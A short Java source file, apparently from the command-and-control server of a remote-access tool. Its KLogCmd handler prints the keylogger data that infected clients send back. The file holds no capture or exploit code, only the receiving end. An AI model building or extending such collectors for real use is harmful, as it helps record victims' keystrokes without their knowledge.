package commands;

import server.CommandServer;
import tools.ParsedCommand;

public class KLogCmd extends ServerCommand {

	public KLogCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {
		StringBuilder sb = new StringBuilder();
		for (int i = 0; i < pCmd.payload.length; i++)
			sb.append((char) pCmd.payload[i]);
		System.out.println(sb.toString());
		return DONE;
	}

}
